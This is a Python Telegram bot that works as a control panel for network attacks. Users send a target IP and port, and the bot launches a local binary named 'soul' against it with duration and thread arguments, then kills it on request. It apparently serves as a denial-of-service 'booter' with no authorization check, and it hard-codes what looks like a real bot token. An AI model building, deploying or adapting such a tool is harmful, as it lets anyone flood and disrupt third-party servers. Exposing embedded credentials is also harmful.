import telebot
import os
import logging
import subprocess
import datetime 
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

TOKEN = '8671769971:AAG1NtcDX56rvDIafzHMuEeDVUh6AFmO6eU'

bot = telebot.TeleBot(TOKEN)
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
user_attack_details = {}
active_attacks = {}

if os.path.exists('./soul'):
    os.chmod('./soul', 0o755)
    
def run_attack_command_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:
            process = subprocess.Popen(["./soul", target_ip, str(target_port), "300", "400"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            active_attacks[(user_id, target_ip, target_port)] = process.pid
        elif action == 2:
            pid = active_attacks.pop((user_id, target_ip, target_port), None)
            if pid:
                subprocess.run(["kill", str(pid)], check=True)
    except Exception as e:
        log_file_path = "error_log.txt"
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            with open(log_file_path, "a", encoding="utf-8") as f:
                f.write(f"[{timestamp}] Error in run_attack_command_sync (User: {user_id}, Target: {target_ip}:{target_port}): {e}\n")
        except Exception as file_error:
            print(f"Failed to write to log file: {file_error}")
        

def send_main_buttons(chat_id):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("Attack"), KeyboardButton("Start Attack 🚀"), KeyboardButton("Stop Attack"))
    bot.send_message(chat_id, "*Choose an action:*", reply_markup=markup, parse_mode='Markdown')


@bot.message_handler(func=lambda message: message.text == "Attack") #commands=['Attack'])
def attack_command(message):
    bot.send_message(message.chat.id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_ip_port)

def process_attack_ip_port(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.send_message(message.chat.id, "*Invalid format. Provide both target IP and port.*", parse_mode='Markdown')
            return

        target_ip, target_port = args[0], int(args[1])
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Use another port.*", parse_mode='Markdown')
            return

        user_attack_details[message.from_user.id] = (target_ip, target_port)
        send_main_buttons(message.chat.id)
    except Exception as e:
        bot.send_message(message.chat.id, "*shi se add kro na *", parse_mode='Markdown')
        logging.error(f"Error in processing attack IP and port: {e}")
        
        
        

@bot.message_handler(func=lambda message: message.text == "Start Attack 🚀")
def start_attack(message):
    attack_details = user_attack_details.get(message.from_user.id)
    if attack_details:
        target_ip, target_port = attack_details
        run_attack_command_sync(message.from_user.id, target_ip, target_port, 1)
        bot.send_message(message.chat.id, f"*Attack started on Host: {target_ip} Port: {target_port}*", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "*No target specified. Use /Attack to set it up.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "Stop Attack")
def stop_attack(message):
    attack_details = user_attack_details.get(message.from_user.id)
    if attack_details:
        target_ip, target_port = attack_details
        run_attack_command_sync(message.from_user.id, target_ip, target_port, 2)
        bot.send_message(message.chat.id, f"*Attack stopped on Host: {target_ip} Port: {target_port}*", parse_mode='Markdown')
        user_attack_details.pop(message.from_user.id, None)
    else:
        bot.send_message(message.chat.id, "*No active attack found to stop.*", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_command(message):
    send_main_buttons(message.chat.id)

if __name__ == "__main__":
    logging.info("Starting bot...")
    bot.delete_webhook(drop_pending_updates=True)
    bot.polling(none_stop=True)
